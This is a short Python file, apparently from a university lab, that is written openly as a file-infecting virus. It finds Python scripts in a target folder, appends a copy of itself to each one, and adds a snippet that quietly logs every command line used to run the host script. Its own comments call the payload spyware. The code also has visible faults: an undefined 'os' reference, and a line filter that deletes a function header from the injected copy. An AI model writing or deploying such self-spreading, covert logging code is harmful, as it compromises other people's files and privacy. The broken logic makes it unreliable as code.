import os as file_system
import sys as system_tools

FILE_DIRECTORY = '/home/cse/Lab2/Solutions'
VIRUS_TAG = '# officially infected'

def gather_python_files(directory):  # Gathers a list of all Python files
    python_files = []
    for file in file_system.listdir(directory):
        if file.endswith(".py"):
            python_files.append(file)
    return python_files

def has_main_block(file_path):  # Checks if the file contains the __main__ block
    with open(file_path, 'r') as file:
        content = file.read()
        return "if __name__ == '__main__':" in content or 'if __name__ == "__main__":' in content

def is_already_infected(file_path):  # Checks if the file contains the virus tag
    with open(file_path, 'r') as file:
        content = file.read()
        return VIRUS_TAG in content

def inject_virus_code(file_path):  # Injects spyware into the file
    with open(__file__, 'r') as file:
        virus_code = file.readlines()
    virus_code = [line for line in virus_code if 'execute_spy_operations()' not in line]
    with open(file_path, 'a') as file:
        file.write('\n\n')
        file.write(f"{VIRUS_TAG}\n")
        file.write("import sys\n")
        file.write("import os\n")
        file.write("command_line = ' '.join(sys.argv)\n")
        file.write("with open('Q1C.out', 'a') as output_file:\n")
        file.write("    output_file.write(command_line + '\\n')\n")
        file.writelines(virus_code)

def execute_spy_operations():  # Main function to handle the spying tasks
    python_files = gather_python_files(FILE_DIRECTORY)
    for file in python_files:
        file_path = os.path.join(FILE_DIRECTORY, file)
        if not file_system.path.exists(file_path):
            print(f"Error: '{file}' does not exist.")
        elif not has_main_block(file_path):
            print(f"Warning: '{file}' is not a valid Python script.")
        elif is_already_infected(file_path):
            print(f"Notice: '{file}' is already infected.")
        else:
            inject_virus_code(file_path)
            print(f"Spyware successfully injected into '{file}'")

if __name__ == "__main__":
    execute_spy_operations()
